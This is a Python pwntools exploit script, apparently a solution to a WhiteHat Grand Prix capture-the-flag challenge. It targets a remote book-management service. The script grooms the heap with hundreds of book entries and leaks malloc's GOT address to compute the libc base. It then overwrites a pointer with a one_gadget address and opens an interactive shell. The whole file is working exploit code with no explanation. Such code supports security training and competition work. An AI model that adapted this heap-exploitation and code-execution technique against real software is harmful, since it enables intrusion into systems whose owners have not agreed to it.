from pwn import *

r = remote("pwn02.grandprix.whitehatvn.com", 8005)

def rc():
    r.recvuntil("choice:")

rc()

def addBook(title, briefSize, brief,referenceTitle="",bestSelling=False):
    r.sendline("1")
    r.recvuntil("Title:")
    r.sendline(title)
    r.recvuntil("size:")
    r.sendline(str(briefSize))
    r.recvuntil("brief:")
    r.sendline(brief)
    r.recvuntil("title:")
    r.sendline(referenceTitle)
    r.recvuntil("(Y/N)")
    if bestSelling:
        r.sendline("Y")
    else:
        r.sendline("N")
    rc()

def removeBook(title):
    r.sendline("3")
    r.recvuntil("Title:")
    r.sendline(title)
    rc()

addBook("first", 10, "CCCC","CCCC", bestSelling=False)

addBook("AAAA",0x3a,"A"*0x30,"AAAA",bestSelling=True)

for m in range(255):
    addBook("abc"+"A"*m,10,"BBBB","AAAA", bestSelling=False)

addBook("newBook", 10, "newBook", "newBook", bestSelling=True)

removeBook("first")


MALLOCGOT = 0x601fd0
ONE_GADGET = 0x10a38c

addBook("newBook2", 58, "\x00"*8+p64(MALLOCGOT)+"F"*8, "newBook2", bestSelling=False)

r.sendline("4")

r.recvuntil("FFFFFFFF|")

leak = r.recvline()

mallocLeak = int(leak.strip()[::-1][4:][:6].encode('hex'),16)
rc()

log.info("malloc leak @ 0x%x" % mallocLeak)

LibcBase = mallocLeak - 0x97070
log.info("libc base @ 0x%x" % LibcBase)

nextPayload = "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFAA" + p64(LibcBase+ONE_GADGET)

r.sendline("2")

r.recvuntil("title:")
r.sendline("newBook2")

r.recvuntil("title:")
r.sendline("pwn")

r.recvuntil("size:")
r.sendline("58")

r.recvuntil("brief:")

r.sendline(nextPayload)

r.interactive()
